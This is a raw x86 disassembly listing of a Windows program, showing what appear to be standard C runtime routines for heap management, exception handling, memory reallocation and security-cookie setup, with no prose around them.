  426fed:	jle    0x426ff2
  426fef:	push   0x3f
  426ff1:	pop    esi
  426ff2:	cmp    esi,edi
  426ff4:	je     0x4270fb
  426ffa:	mov    ecx,DWORD PTR [edx+0x4]
  426ffd:	cmp    ecx,DWORD PTR [edx+0x8]
  427000:	jne    0x42705e
  427002:	cmp    edi,0x20
  427005:	mov    ebx,0x80000000
  42700a:	jge    0x427032
  42700c:	mov    ecx,edi
  42700e:	shr    ebx,cl
  427010:	mov    ecx,DWORD PTR [ebp-0x4]
  427013:	lea    edi,[eax+edi*1+0x4]
  427017:	not    ebx
  427019:	mov    DWORD PTR [ebp-0x14],ebx
  42701c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  427020:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  427024:	dec    BYTE PTR [edi]
  427026:	jne    0x42705b
  427028:	mov    ecx,DWORD PTR [ebp-0x14]
  42702b:	mov    ebx,DWORD PTR [ebp+0x8]
  42702e:	and    DWORD PTR [ebx],ecx
  427030:	jmp    0x42705e
  427032:	lea    ecx,[edi-0x20]
  427035:	shr    ebx,cl
  427037:	mov    ecx,DWORD PTR [ebp-0x4]
  42703a:	lea    ecx,[eax+ecx*4+0xc4]
  427041:	lea    edi,[eax+edi*1+0x4]
  427045:	not    ebx
  427047:	and    DWORD PTR [ecx],ebx
  427049:	dec    BYTE PTR [edi]
  42704b:	mov    DWORD PTR [ebp-0x14],ebx
  42704e:	jne    0x42705b
  427050:	mov    ebx,DWORD PTR [ebp+0x8]
  427053:	mov    ecx,DWORD PTR [ebp-0x14]
  427056:	and    DWORD PTR [ebx+0x4],ecx
  427059:	jmp    0x42705e
  42705b:	mov    ebx,DWORD PTR [ebp+0x8]
  42705e:	cmp    DWORD PTR [ebp-0x8],0x0
  427062:	mov    ecx,DWORD PTR [edx+0x8]
  427065:	mov    edi,DWORD PTR [edx+0x4]
  427068:	mov    DWORD PTR [ecx+0x4],edi
  42706b:	mov    ecx,DWORD PTR [edx+0x4]
  42706e:	mov    edi,DWORD PTR [edx+0x8]
  427071:	mov    DWORD PTR [ecx+0x8],edi
  427074:	je     0x427107
  42707a:	mov    ecx,DWORD PTR [ebp-0xc]
  42707d:	lea    ecx,[ecx+esi*8]
  427080:	mov    edi,DWORD PTR [ecx+0x4]
  427083:	mov    DWORD PTR [edx+0x8],ecx
  427086:	mov    DWORD PTR [edx+0x4],edi
  427089:	mov    DWORD PTR [ecx+0x4],edx
  42708c:	mov    ecx,DWORD PTR [edx+0x4]
  42708f:	mov    DWORD PTR [ecx+0x8],edx
  427092:	mov    ecx,DWORD PTR [edx+0x4]
  427095:	cmp    ecx,DWORD PTR [edx+0x8]
  427098:	jne    0x4270f8
  42709a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42709e:	mov    BYTE PTR [ebp+0xb],cl
  4270a1:	inc    cl
  4270a3:	cmp    esi,0x20
  4270a6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4270aa:	jge    0x4270cf
  4270ac:	cmp    BYTE PTR [ebp+0xb],0x0
  4270b0:	jne    0x4270bd
  4270b2:	mov    edi,0x80000000
  4270b7:	mov    ecx,esi
  4270b9:	shr    edi,cl
  4270bb:	or     DWORD PTR [ebx],edi
  4270bd:	mov    ecx,esi
  4270bf:	mov    edi,0x80000000
  4270c4:	shr    edi,cl
  4270c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4270cd:	jmp    0x4270f8
  4270cf:	cmp    BYTE PTR [ebp+0xb],0x0
  4270d3:	jne    0x4270e2
  4270d5:	lea    ecx,[esi-0x20]
  4270d8:	mov    edi,0x80000000
  4270dd:	shr    edi,cl
  4270df:	or     DWORD PTR [ebx+0x4],edi
  4270e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4270e5:	lea    edi,[eax+ecx*4+0xc4]
  4270ec:	lea    ecx,[esi-0x20]
  4270ef:	mov    esi,0x80000000
  4270f4:	shr    esi,cl
  4270f6:	or     DWORD PTR [edi],esi
  4270f8:	mov    ecx,DWORD PTR [ebp-0x8]
  4270fb:	test   ecx,ecx
  4270fd:	je     0x42710a
  4270ff:	mov    DWORD PTR [edx],ecx
  427101:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  427105:	jmp    0x42710a
  427107:	mov    ecx,DWORD PTR [ebp-0x8]
  42710a:	mov    esi,DWORD PTR [ebp-0x10]
  42710d:	add    edx,ecx
  42710f:	lea    ecx,[esi+0x1]
  427112:	mov    DWORD PTR [edx],ecx
  427114:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  427118:	mov    esi,DWORD PTR [ebp-0xc]
  42711b:	mov    ecx,DWORD PTR [esi]
  42711d:	test   ecx,ecx
  42711f:	lea    edi,[ecx+0x1]
  427122:	mov    DWORD PTR [esi],edi
  427124:	jne    0x427140
  427126:	cmp    ebx,DWORD PTR ds:0x4674b8
  42712c:	jne    0x427140
  42712e:	mov    ecx,DWORD PTR [ebp-0x4]
  427131:	cmp    ecx,DWORD PTR ds:0x4674d0
  427137:	jne    0x427140
  427139:	and    DWORD PTR ds:0x4674b8,0x0
  427140:	mov    ecx,DWORD PTR [ebp-0x4]
  427143:	mov    DWORD PTR [eax],ecx
  427145:	lea    eax,[edx+0x4]
  427148:	pop    edi
  427149:	pop    esi
  42714a:	pop    ebx
  42714b:	leave  
  42714c:	ret    
  42714d:	int3   
  42714e:	int3   
  42714f:	int3   
  427150:	push   esi
  427151:	inc    ebx
  427152:	xor    dh,BYTE PTR [eax]
  427154:	pop    eax
  427155:	inc    ebx
  427156:	xor    BYTE PTR [eax],dh
  427158:	push   ebp
  427159:	mov    ebp,esp
  42715b:	sub    esp,0x8
  42715e:	push   ebx
  42715f:	push   esi
  427160:	push   edi
  427161:	push   ebp
  427162:	cld    
  427163:	mov    ebx,DWORD PTR [ebp+0xc]
  427166:	mov    eax,DWORD PTR [ebp+0x8]
  427169:	test   DWORD PTR [eax+0x4],0x6
  427170:	jne    0x4271f8
  427176:	mov    DWORD PTR [ebp-0x8],eax
  427179:	mov    eax,DWORD PTR [ebp+0x10]
  42717c:	mov    DWORD PTR [ebp-0x4],eax
  42717f:	lea    eax,[ebp-0x8]
  427182:	mov    DWORD PTR [ebx-0x4],eax
  427185:	mov    esi,DWORD PTR [ebx+0xc]
  427188:	mov    edi,DWORD PTR [ebx+0x8]
  42718b:	cmp    esi,0xffffffff
  42718e:	je     0x4271f1
  427190:	lea    ecx,[esi+esi*2]
  427193:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427198:	je     0x4271df
  42719a:	push   esi
  42719b:	push   ebp
  42719c:	lea    ebp,[ebx+0x10]
  42719f:	call   DWORD PTR [edi+ecx*4+0x4]
  4271a3:	pop    ebp
  4271a4:	pop    esi
  4271a5:	mov    ebx,DWORD PTR [ebp+0xc]
  4271a8:	or     eax,eax
  4271aa:	je     0x4271df
  4271ac:	js     0x4271ea
  4271ae:	mov    edi,DWORD PTR [ebx+0x8]
  4271b1:	push   ebx
  4271b2:	call   0x4280e0
  4271b7:	add    esp,0x4
  4271ba:	lea    ebp,[ebx+0x10]
  4271bd:	push   esi
  4271be:	push   ebx
  4271bf:	call   0x428122
  4271c4:	add    esp,0x8
  4271c7:	lea    ecx,[esi+esi*2]
  4271ca:	push   0x1
  4271cc:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4271d0:	call   0x4281b6
  4271d5:	mov    eax,DWORD PTR [edi+ecx*4]
  4271d8:	mov    DWORD PTR [ebx+0xc],eax
  4271db:	call   DWORD PTR [edi+ecx*4+0x8]
  4271df:	mov    edi,DWORD PTR [ebx+0x8]
  4271e2:	lea    ecx,[esi+esi*2]
  4271e5:	mov    esi,DWORD PTR [edi+ecx*4]
  4271e8:	jmp    0x42718b
  4271ea:	mov    eax,0x0
  4271ef:	jmp    0x42720d
  4271f1:	mov    eax,0x1
  4271f6:	jmp    0x42720d
  4271f8:	push   ebp
  4271f9:	lea    ebp,[ebx+0x10]
  4271fc:	push   0xffffffff
  4271fe:	push   ebx
  4271ff:	call   0x428122
  427204:	add    esp,0x8
  427207:	pop    ebp
  427208:	mov    eax,0x1
  42720d:	pop    ebp
  42720e:	pop    edi
  42720f:	pop    esi
  427210:	pop    ebx
  427211:	mov    esp,ebp
  427213:	pop    ebp
  427214:	ret    
  427215:	push   ebp
  427216:	mov    ecx,DWORD PTR [esp+0x8]
  42721a:	mov    ebp,DWORD PTR [ecx]
  42721c:	mov    eax,DWORD PTR [ecx+0x1c]
  42721f:	push   eax
  427220:	mov    eax,DWORD PTR [ecx+0x18]
  427223:	push   eax
  427224:	call   0x428122
  427229:	add    esp,0x8
  42722c:	pop    ebp
  42722d:	ret    0x4
  427230:	call   0x425145
  427235:	add    eax,0x8
  427238:	ret    
  427239:	push   0x14
  42723b:	push   0x4297c8
  427240:	call   0x425290
  427245:	mov    edi,DWORD PTR [ebp+0x8]
  427248:	xor    ebx,ebx
  42724a:	cmp    edi,ebx
  42724c:	jne    0x42725c
  42724e:	push   DWORD PTR [ebp+0xc]
  427251:	call   0x425fb2
  427256:	pop    ecx
  427257:	jmp    0x4273e0
  42725c:	mov    esi,DWORD PTR [ebp+0xc]
  42725f:	cmp    esi,ebx
  427261:	jne    0x42726f
  427263:	push   edi
  427264:	call   0x425e9a
  427269:	pop    ecx
  42726a:	jmp    0x4273de
  42726f:	cmp    DWORD PTR ds:0x467704,0x3
  427276:	jne    0x4273aa
  42727c:	mov    DWORD PTR [ebp-0x1c],ebx
  42727f:	cmp    esi,0xffffffe0
  427282:	ja     0x427379
  427288:	push   0x4
  42728a:	call   0x42544f
  42728f:	pop    ecx
  427290:	mov    DWORD PTR [ebp-0x4],ebx
  427293:	push   edi
  427294:	call   0x426672
  427299:	pop    ecx
  42729a:	mov    DWORD PTR [ebp-0x20],eax
  42729d:	cmp    eax,ebx
  42729f:	je     0x427349
  4272a5:	cmp    esi,DWORD PTR ds:0x4674c4
  4272ab:	ja     0x4272f9
  4272ad:	push   esi
  4272ae:	push   edi
  4272af:	push   eax
  4272b0:	call   0x426b72
  4272b5:	add    esp,0xc
  4272b8:	test   eax,eax
  4272ba:	je     0x4272c1
  4272bc:	mov    DWORD PTR [ebp-0x1c],edi
  4272bf:	jmp    0x4272f9
  4272c1:	push   esi
  4272c2:	call   0x426e51
  4272c7:	pop    ecx
  4272c8:	mov    DWORD PTR [ebp-0x1c],eax
  4272cb:	cmp    eax,ebx
  4272cd:	je     0x4272f9
  4272cf:	mov    eax,DWORD PTR [edi-0x4]
  4272d2:	dec    eax
  4272d3:	mov    DWORD PTR [ebp-0x24],eax
  4272d6:	cmp    eax,esi
  4272d8:	jb     0x4272dc
  4272da:	mov    eax,esi
  4272dc:	push   eax
  4272dd:	push   edi
  4272de:	push   DWORD PTR [ebp-0x1c]
  4272e1:	call   0x425fd0
  4272e6:	push   edi
  4272e7:	call   0x426672
  4272ec:	mov    DWORD PTR [ebp-0x20],eax
  4272ef:	push   edi
  4272f0:	push   eax
  4272f1:	call   0x42669d
  4272f6:	add    esp,0x18
  4272f9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4272fc:	jne    0x427349
  4272fe:	cmp    esi,ebx
  427300:	jne    0x427308
  427302:	xor    esi,esi
  427304:	inc    esi
  427305:	mov    DWORD PTR [ebp+0xc],esi
  427308:	add    esi,0xf
  42730b:	and    esi,0xfffffff0
  42730e:	mov    DWORD PTR [ebp+0xc],esi
  427311:	push   esi
  427312:	push   ebx
  427313:	push   DWORD PTR ds:0x467700
  427319:	call   DWORD PTR ds:0x4290dc
  42731f:	mov    DWORD PTR [ebp-0x1c],eax
  427322:	cmp    eax,ebx
  427324:	je     0x427349
  427326:	mov    eax,DWORD PTR [edi-0x4]
  427329:	dec    eax
  42732a:	mov    DWORD PTR [ebp-0x24],eax
  42732d:	cmp    eax,esi
  42732f:	jb     0x427333
  427331:	mov    eax,esi
  427333:	push   eax
  427334:	push   edi
  427335:	push   DWORD PTR [ebp-0x1c]
  427338:	call   0x425fd0
  42733d:	push   edi
  42733e:	push   DWORD PTR [ebp-0x20]
  427341:	call   0x42669d
  427346:	add    esp,0x14
  427349:	or     DWORD PTR [ebp-0x4],0xffffffff
  42734d:	call   0x4273a1
  427352:	cmp    DWORD PTR [ebp-0x20],ebx
  427355:	jne    0x427379
  427357:	cmp    esi,ebx
  427359:	jne    0x42735e
  42735b:	xor    esi,esi
  42735d:	inc    esi
  42735e:	add    esi,0xf
  427361:	and    esi,0xfffffff0
  427364:	mov    DWORD PTR [ebp+0xc],esi
  427367:	push   esi
  427368:	push   edi
  427369:	push   ebx
  42736a:	push   DWORD PTR ds:0x467700
  427370:	call   DWORD PTR ds:0x4290e8
  427376:	mov    DWORD PTR [ebp-0x1c],eax
  427379:	mov    eax,DWORD PTR [ebp-0x1c]
  42737c:	cmp    eax,ebx
  42737e:	jne    0x4273e0
  427380:	cmp    DWORD PTR ds:0x467388,ebx
  427386:	je     0x4273e0
  427388:	push   esi
  427389:	call   0x427b72
  42738e:	pop    ecx
  42738f:	test   eax,eax
  427391:	jne    0x42727c
  427397:	jmp    0x4273de
  427399:	xor    ebx,ebx
  42739b:	mov    esi,DWORD PTR [ebp+0xc]
  42739e:	mov    edi,DWORD PTR [ebp+0x8]
  4273a1:	push   0x4
  4273a3:	call   0x4253bb
  4273a8:	pop    ecx
  4273a9:	ret    
  4273aa:	xor    eax,eax
  4273ac:	cmp    esi,0xffffffe0
  4273af:	ja     0x4273c7
  4273b1:	cmp    esi,ebx
  4273b3:	jne    0x4273b8
  4273b5:	xor    esi,esi
  4273b7:	inc    esi
  4273b8:	push   esi
  4273b9:	push   edi
  4273ba:	push   ebx
  4273bb:	push   DWORD PTR ds:0x467700
  4273c1:	call   DWORD PTR ds:0x4290e8
  4273c7:	cmp    eax,ebx
  4273c9:	jne    0x4273e0
  4273cb:	cmp    DWORD PTR ds:0x467388,ebx
  4273d1:	je     0x4273e0
  4273d3:	push   esi
  4273d4:	call   0x427b72
  4273d9:	pop    ecx
  4273da:	test   eax,eax
  4273dc:	jne    0x4273aa
  4273de:	xor    eax,eax
  4273e0:	call   0x4252cb
  4273e5:	ret    
  4273e6:	push   0x10
  4273e8:	push   0x4297d8
  4273ed:	call   0x425290
  4273f2:	cmp    DWORD PTR ds:0x467704,0x3
  4273f9:	jne    0x427435
  4273fb:	push   0x4
  4273fd:	call   0x42544f
  427402:	pop    ecx
  427403:	and    DWORD PTR [ebp-0x4],0x0
  427407:	mov    esi,DWORD PTR [ebp+0x8]
  42740a:	push   esi
  42740b:	call   0x426672
  427410:	pop    ecx
  427411:	mov    DWORD PTR [ebp-0x1c],eax
  427414:	test   eax,eax
  427416:	je     0x427423
  427418:	mov    esi,DWORD PTR [esi-0x4]
  42741b:	sub    esi,0x9
  42741e:	mov    DWORD PTR [ebp-0x20],esi
  427421:	jmp    0x427426
  427423:	mov    esi,DWORD PTR [ebp-0x20]
  427426:	or     DWORD PTR [ebp-0x4],0xffffffff
  42742a:	call   0x427453
  42742f:	cmp    DWORD PTR [ebp-0x1c],0x0
  427433:	jne    0x427448
  427435:	push   DWORD PTR [ebp+0x8]
  427438:	push   0x0
  42743a:	push   DWORD PTR ds:0x467700
  427440:	call   DWORD PTR ds:0x4290ec
  427446:	mov    esi,eax
  427448:	mov    eax,esi
  42744a:	call   0x4252cb
  42744f:	ret    
  427450:	mov    esi,DWORD PTR [ebp-0x20]
  427453:	push   0x4
  427455:	call   0x4253bb
  42745a:	pop    ecx
  42745b:	ret    
  42745c:	push   ebp
  42745d:	mov    ebp,esp
  42745f:	sub    esp,0x10
  427462:	push   esi
  427463:	lea    eax,[ebp-0x8]
  427466:	push   eax
  427467:	call   DWORD PTR ds:0x4290fc
  42746d:	mov    esi,DWORD PTR [ebp-0x4]
  427470:	xor    esi,DWORD PTR [ebp-0x8]
  427473:	call   DWORD PTR ds:0x4290f8
  427479:	xor    esi,eax
  42747b:	call   DWORD PTR ds:0x4290b4
  427481:	xor    esi,eax
  427483:	call   DWORD PTR ds:0x4290f4
  427489:	xor    esi,eax
  42748b:	lea    eax,[ebp-0x10]
  42748e:	push   eax
  42748f:	call   DWORD PTR ds:0x4290f0
  427495:	mov    eax,DWORD PTR [ebp-0xc]
  427498:	xor    eax,DWORD PTR [ebp-0x10]
  42749b:	xor    esi,eax
  42749d:	mov    DWORD PTR ds:0x4669f0,esi
  4274a3:	jne    0x4274af
  4274a5:	mov    DWORD PTR ds:0x4669f0,0xbb40e64e
  4274af:	pop    esi
  4274b0:	leave  
  4274b1:	ret    
  4274b2:	push   0x118
  4274b7:	push   0x429988
  4274bc:	call   0x425290
  4274c1:	mov    eax,ds:0x4669f0
  4274c6:	xor    eax,DWORD PTR [ebp+0x4]
  4274c9:	mov    DWORD PTR [ebp-0x1c],eax
  4274cc:	mov    eax,ds:0x467358
  4274d1:	xor    ecx,ecx
  4274d3:	cmp    eax,ecx
  4274d5:	je     0x4274f6
  4274d7:	mov    DWORD PTR [ebp-0x4],ecx
  4274da:	push   DWORD PTR [ebp+0xc]
  4274dd:	push   DWORD PTR [ebp+0x8]
  4274e0:	call   eax
  4274e2:	pop    ecx
  4274e3:	pop    ecx
  4274e4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274e8:	jmp    0x4275f4
  4274ed:	xor    eax,eax
  4274ef:	inc    eax
  4274f0:	ret    
  4274f1:	mov    esp,DWORD PTR [ebp-0x18]
  4274f4:	jmp    0x4274e4
  4274f6:	mov    eax,DWORD PTR [ebp+0x8]
  4274f9:	dec    eax
  4274fa:	je     0x42750f
  4274fc:	mov    edi,0x429964
  427501:	mov    DWORD PTR [ebp-0x20],0x4298b0
  427508:	mov    esi,0xd4
  42750d:	jmp    0x427520
  42750f:	mov    edi,0x429890
  427514:	mov    DWORD PTR [ebp-0x20],0x4297f0
  42751b:	mov    esi,0xb9
  427520:	mov    BYTE PTR [ebp-0x24],cl
  427523:	push   0x104
  427528:	lea    eax,[ebp-0x128]
  42752e:	push   eax
  42752f:	push   ecx
  427530:	call   DWORD PTR ds:0x429084
  427536:	test   eax,eax
  427538:	jne    0x42754d
  42753a:	push   0x4294e4
  42753f:	lea    eax,[ebp-0x128]
  427545:	push   eax
  427546:	call   0x425670
  42754b:	pop    ecx
  42754c:	pop    ecx
  42754d:	lea    ebx,[ebp-0x128]
  427553:	lea    eax,[ebp-0x128]
  427559:	push   eax
  42755a:	call   0x4258a0
  42755f:	pop    ecx
  427560:	add    eax,0xb
  427563:	cmp    eax,0x3c
  427566:	jbe    0x427591
  427568:	lea    eax,[ebp-0x128]
  42756e:	push   eax
  42756f:	call   0x4258a0
  427574:	mov    ebx,eax
  427576:	lea    eax,[ebp-0x128]
  42757c:	sub    eax,0x31
  42757f:	add    ebx,eax
  427581:	push   0x3
  427583:	push   0x4294e0
  427588:	push   ebx
  427589:	call   0x425770
  42758e:	add    esp,0x10
  427591:	push   ebx
  427592:	call   0x4258a0
  427597:	pop    ecx
  427598:	lea    eax,[eax+esi*1+0xc]
  42759c:	add    eax,0x3
  42759f:	and    eax,0xfffffffc
  4275a2:	call   0x4252e0
  4275a7:	mov    DWORD PTR [ebp-0x18],esp
  4275aa:	mov    esi,esp
  4275ac:	push   edi
  4275ad:	push   esi
  4275ae:	call   0x425670
  4275b3:	mov    edi,0x4294c0
  4275b8:	push   edi
  4275b9:	push   esi
  4275ba:	call   0x425680
  4275bf:	push   0x4297e4
  4275c4:	push   esi
  4275c5:	call   0x425680
  4275ca:	push   ebx
  4275cb:	push   esi
  4275cc:	call   0x425680
  4275d1:	push   edi
  4275d2:	push   esi
  4275d3:	call   0x425680
  4275d8:	push   DWORD PTR [ebp-0x20]
  4275db:	push   esi
  4275dc:	call   0x425680
  4275e1:	push   0x12010
  4275e6:	push   0x429498
  4275eb:	push   esi
  4275ec:	call   0x425572
  4275f1:	add    esp,0x3c
  4275f4:	push   0x3
  4275f6:	call   0x4246fe
  4275fb:	int3   
  4275fc:	push   0x38
  4275fe:	push   0x429da8
  427603:	call   0x425290
  427608:	xor    ebx,ebx
  42760a:	cmp    DWORD PTR ds:0x46737c,ebx
  427610:	jne    0x42764a
  427612:	push   ebx
  427613:	push   ebx
  427614:	xor    esi,esi
  427616:	inc    esi
  427617:	push   esi
  427618:	push   0x429da4
  42761d:	push   0x100
  427622:	push   ebx
  427623:	call   DWORD PTR ds:0x429108
  427629:	test   eax,eax
  42762b:	je     0x427635
  42762d:	mov    DWORD PTR ds:0x46737c,esi
  427633:	jmp    0x42764a
  427635:	call   DWORD PTR ds:0x429034
  42763b:	cmp    eax,0x78
  42763e:	jne    0x42764a
  427640:	mov    DWORD PTR ds:0x46737c,0x2
  42764a:	cmp    DWORD PTR [ebp+0x14],ebx
  42764d:	jle    0x42766a
  42764f:	mov    ecx,DWORD PTR [ebp+0x14]
  427652:	mov    eax,DWORD PTR [ebp+0x10]
  427655:	dec    ecx
  427656:	cmp    BYTE PTR [eax],bl
  427658:	je     0x427662
  42765a:	inc    eax
  42765b:	cmp    ecx,ebx
  42765d:	jne    0x427655
  42765f:	or     ecx,0xffffffff
  427662:	or     eax,0xffffffff
  427665:	sub    eax,ecx
  427667:	add    DWORD PTR [ebp+0x14],eax
  42766a:	mov    eax,ds:0x46737c
  42766f:	cmp    eax,0x2
  427672:	je     0x427854
  427678:	cmp    eax,ebx
  42767a:	je     0x427854
  427680:	cmp    eax,0x1
  427683:	jne    0x427887
  427689:	xor    edi,edi
  42768b:	mov    DWORD PTR [ebp-0x1c],edi
  42768e:	mov    DWORD PTR [ebp-0x20],ebx
  427691:	mov    DWORD PTR [ebp-0x24],ebx
  427694:	cmp    DWORD PTR [ebp+0x20],ebx
  427697:	jne    0x4276a1
  427699:	mov    eax,ds:0x467374
  42769e:	mov    DWORD PTR [ebp+0x20],eax
  4276a1:	push   ebx
  4276a2:	push   ebx
  4276a3:	push   DWORD PTR [ebp+0x14]
  4276a6:	push   DWORD PTR [ebp+0x10]
  4276a9:	xor    eax,eax
  4276ab:	cmp    DWORD PTR [ebp+0x24],ebx
  4276ae:	setne  al
  4276b1:	lea    eax,[eax*8+0x1]
  4276b8:	push   eax
  4276b9:	push   DWORD PTR [ebp+0x20]
  4276bc:	call   DWORD PTR ds:0x429104
  4276c2:	mov    esi,eax
  4276c4:	mov    DWORD PTR [ebp-0x28],esi
  4276c7:	cmp    esi,ebx
  4276c9:	je     0x427887
  4276cf:	mov    DWORD PTR [ebp-0x4],0x1
  4276d6:	lea    eax,[esi+esi*1]
  4276d9:	add    eax,0x3
  4276dc:	and    eax,0xfffffffc
  4276df:	call   0x4252e0
  4276e4:	mov    DWORD PTR [ebp-0x18],esp
  4276e7:	mov    eax,esp
  4276e9:	mov    DWORD PTR [ebp-0x2c],eax
  4276ec:	or     DWORD PTR [ebp-0x4],0xffffffff
  4276f0:	jmp    0x42770d
  4276f2:	xor    eax,eax
  4276f4:	inc    eax
  4276f5:	ret    
  4276f6:	mov    esp,DWORD PTR [ebp-0x18]
  4276f9:	call   0x428725
  4276fe:	xor    ebx,ebx
  427700:	mov    DWORD PTR [ebp-0x2c],ebx
  427703:	or     DWORD PTR [ebp-0x4],0xffffffff
  427707:	mov    edi,DWORD PTR [ebp-0x1c]
  42770a:	mov    esi,DWORD PTR [ebp-0x28]
  42770d:	cmp    DWORD PTR [ebp-0x2c],ebx
  427710:	jne    0x42772e
  427712:	lea    eax,[esi+esi*1]
  427715:	push   eax
  427716:	call   0x425fb2
  42771b:	pop    ecx
  42771c:	mov    DWORD PTR [ebp-0x2c],eax
  42771f:	cmp    eax,ebx
  427721:	je     0x427887
  427727:	mov    DWORD PTR [ebp-0x20],0x1
  42772e:	push   esi
  42772f:	push   DWORD PTR [ebp-0x2c]
  427732:	push   DWORD PTR [ebp+0x14]
  427735:	push   DWORD PTR [ebp+0x10]
  427738:	push   0x1
  42773a:	push   DWORD PTR [ebp+0x20]
  42773d:	call   DWORD PTR ds:0x429104
  427743:	test   eax,eax
  427745:	je     0x427831
  42774b:	push   ebx
  42774c:	push   ebx
  42774d:	push   esi
  42774e:	push   DWORD PTR [ebp-0x2c]
  427751:	push   DWORD PTR [ebp+0xc]
  427754:	push   DWORD PTR [ebp+0x8]
  427757:	call   DWORD PTR ds:0x429108
  42775d:	mov    edi,eax
  42775f:	mov    DWORD PTR [ebp-0x1c],edi
  427762:	cmp    edi,ebx
  427764:	je     0x427831
  42776a:	test   BYTE PTR [ebp+0xd],0x4
  42776e:	je     0x42779d
  427770:	cmp    DWORD PTR [ebp+0x1c],ebx
  427773:	je     0x427831
  427779:	cmp    edi,DWORD PTR [ebp+0x1c]
  42777c:	jg     0x427831
  427782:	push   DWORD PTR [ebp+0x1c]
  427785:	push   DWORD PTR [ebp+0x18]
  427788:	push   esi
  427789:	push   DWORD PTR [ebp-0x2c]
  42778c:	push   DWORD PTR [ebp+0xc]
  42778f:	push   DWORD PTR [ebp+0x8]
  427792:	call   DWORD PTR ds:0x429108
  427798:	jmp    0x427831
  42779d:	mov    DWORD PTR [ebp-0x4],0x2
  4277a4:	lea    eax,[edi+edi*1]
  4277a7:	add    eax,0x3
  4277aa:	and    eax,0xfffffffc
  4277ad:	call   0x4252e0
  4277b2:	mov    DWORD PTR [ebp-0x18],esp
  4277b5:	mov    eax,esp
  4277b7:	mov    DWORD PTR [ebp-0x30],eax
  4277ba:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277be:	jmp    0x4277db
  4277c0:	xor    eax,eax
  4277c2:	inc    eax
  4277c3:	ret    
  4277c4:	mov    esp,DWORD PTR [ebp-0x18]
  4277c7:	call   0x428725
  4277cc:	xor    ebx,ebx
  4277ce:	mov    DWORD PTR [ebp-0x30],ebx
  4277d1:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277d5:	mov    edi,DWORD PTR [ebp-0x1c]
  4277d8:	mov    esi,DWORD PTR [ebp-0x28]
  4277db:	cmp    DWORD PTR [ebp-0x30],ebx
  4277de:	jne    0x4277f8
  4277e0:	lea    eax,[edi+edi*1]
  4277e3:	push   eax
  4277e4:	call   0x425fb2
  4277e9:	pop    ecx
  4277ea:	mov    DWORD PTR [ebp-0x30],eax
  4277ed:	cmp    eax,ebx
  4277ef:	je     0x427831
  4277f1:	mov    DWORD PTR [ebp-0x24],0x1
  4277f8:	push   edi
  4277f9:	push   DWORD PTR [ebp-0x30]
  4277fc:	push   esi
  4277fd:	push   DWORD PTR [ebp-0x2c]
  427800:	push   DWORD PTR [ebp+0xc]
  427803:	push   DWORD PTR [ebp+0x8]
  427806:	call   DWORD PTR ds:0x429108
  42780c:	test   eax,eax
  42780e:	je     0x427831
  427810:	push   ebx
  427811:	push   ebx
  427812:	cmp    DWORD PTR [ebp+0x1c],ebx
  427815:	jne    0x42781b
  427817:	push   ebx
  427818:	push   ebx
  427819:	jmp    0x427821
  42781b:	push   DWORD PTR [ebp+0x1c]
  42781e:	push   DWORD PTR [ebp+0x18]
  427821:	push   edi
  427822:	push   DWORD PTR [ebp-0x30]
  427825:	push   ebx
  427826:	push   DWORD PTR [ebp+0x20]
  427829:	call   DWORD PTR ds:0x429098
  42782f:	mov    edi,eax
  427831:	cmp    DWORD PTR [ebp-0x24],ebx
  427834:	je     0x42783f
  427836:	push   DWORD PTR [ebp-0x30]
  427839:	call   0x425e9a
  42783e:	pop    ecx
  42783f:	cmp    DWORD PTR [ebp-0x20],ebx
  427842:	je     0x42784d
  427844:	push   DWORD PTR [ebp-0x2c]
  427847:	call   0x425e9a
  42784c:	pop    ecx
  42784d:	mov    eax,edi
  42784f:	jmp    0x4279af
  427854:	mov    DWORD PTR [ebp-0x34],ebx
  427857:	xor    edi,edi
  427859:	mov    DWORD PTR [ebp-0x38],ebx
  42785c:	cmp    DWORD PTR [ebp+0x8],ebx
  42785f:	jne    0x427869
  427861:	mov    eax,ds:0x467364
  427866:	mov    DWORD PTR [ebp+0x8],eax
  427869:	cmp    DWORD PTR [ebp+0x20],ebx
  42786c:	jne    0x427876
  42786e:	mov    eax,ds:0x467374
  427873:	mov    DWORD PTR [ebp+0x20],eax
  427876:	push   DWORD PTR [ebp+0x8]
  427879:	call   0x42850d
  42787e:	pop    ecx
  42787f:	mov    DWORD PTR [ebp-0x3c],eax
  427882:	cmp    eax,0xffffffff
  427885:	jne    0x42788e
  427887:	xor    eax,eax
  427889:	jmp    0x4279af
  42788e:	cmp    eax,DWORD PTR [ebp+0x20]
  427891:	je     0x427985
  427897:	push   ebx
  427898:	push   ebx
  427899:	lea    ecx,[ebp+0x14]
  42789c:	push   ecx
  42789d:	push   DWORD PTR [ebp+0x10]
  4278a0:	push   eax
  4278a1:	push   DWORD PTR [ebp+0x20]
  4278a4:	call   0x428556
  4278a9:	add    esp,0x18
  4278ac:	mov    DWORD PTR [ebp-0x34],eax
  4278af:	cmp    eax,ebx
  4278b1:	je     0x427887
  4278b3:	push   ebx
  4278b4:	push   ebx
  4278b5:	push   DWORD PTR [ebp+0x14]
  4278b8:	push   eax
  4278b9:	push   DWORD PTR [ebp+0xc]
  4278bc:	push   DWORD PTR [ebp+0x8]
  4278bf:	call   DWORD PTR ds:0x429100
  4278c5:	mov    esi,eax
  4278c7:	mov    DWORD PTR [ebp-0x40],esi
  4278ca:	cmp    esi,ebx
  4278cc:	je     0x427974
  4278d2:	mov    DWORD PTR [ebp-0x4],ebx
  4278d5:	add    eax,0x3
  4278d8:	and    eax,0xfffffffc
  4278db:	call   0x4252e0
  4278e0:	mov    DWORD PTR [ebp-0x18],esp
  4278e3:	mov    edi,esp
  4278e5:	mov    DWORD PTR [ebp-0x44],edi
  4278e8:	push   esi
  4278e9:	push   ebx
  4278ea:	push   edi
